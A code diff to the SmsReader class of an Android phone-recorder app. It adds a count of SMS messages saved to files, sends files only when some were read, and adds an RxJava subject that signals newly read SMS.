@@ -29,6 +29,8 @@ import io.reactivex.disposables.Disposable;
 import io.reactivex.functions.Consumer;
 import io.reactivex.functions.Function;
 import io.reactivex.schedulers.Schedulers;
+import io.reactivex.subjects.PublishSubject;
+import io.reactivex.subjects.Subject;
 import phonerecorder.kivsw.com.phonerecorder.BuildConfig;
 
 /**
@@ -57,6 +59,7 @@ public class SmsReader implements ITask  {
     }
 
     private boolean isSending=false, tryToSendAgain=false;
+    private volatile int readSMSCount=0;
     @Override
     public boolean startTask() {
         if(!settings.getEnableSmsRecording())
@@ -68,6 +71,7 @@ public class SmsReader implements ITask  {
         };
         isSending=true;
         tryToSendAgain=false;
+        readSMSCount=0;
 
         final long lastIncomeSmsId=persistentDataKeeper.getLastIncomeSms(),
                    lastOutgoingSmsId=persistentDataKeeper.getLastOutgoingSms();
@@ -115,7 +119,10 @@ public class SmsReader implements ITask  {
             @Override
             public void onComplete() {
                 taskExecutor.stopSMSreading();
-                taskExecutor.startFileSending();
+                if(readSMSCount>0) {
+                    taskExecutor.startFileSending();
+                    onNewSmsReadObservable.onNext("");
+                }
                 isSending=false;
 
                 if(tryToSendAgain)
@@ -216,6 +223,7 @@ public class SmsReader implements ITask  {
     {
         String fileName = createFileName(sms);
         SimpleFileIO.writeFile(fileName, sms.body);
+        readSMSCount++;
 
         /*FileWriter writer = new FileWriter(fileName,false);
         writer.append(sms.body);
@@ -229,6 +237,16 @@ public class SmsReader implements ITask  {
         String recordFileNameData = RecordFileNameData.generateNew(date, sms.address, sms.isIncome(), "", "sms")
                 .buildFileName();
         return settings.getInternalTempPath() + recordFileNameData;
+    }
+
+    Subject<Object> onNewSmsReadObservable = PublishSubject.create();
+    /**
+     * emitts on start and stop recording
+     * @return
+     */
+    public Observable<Object> getOnNewSmsReadObservable()
+    {
+        return onNewSmsReadObservable;
     }
 
 }
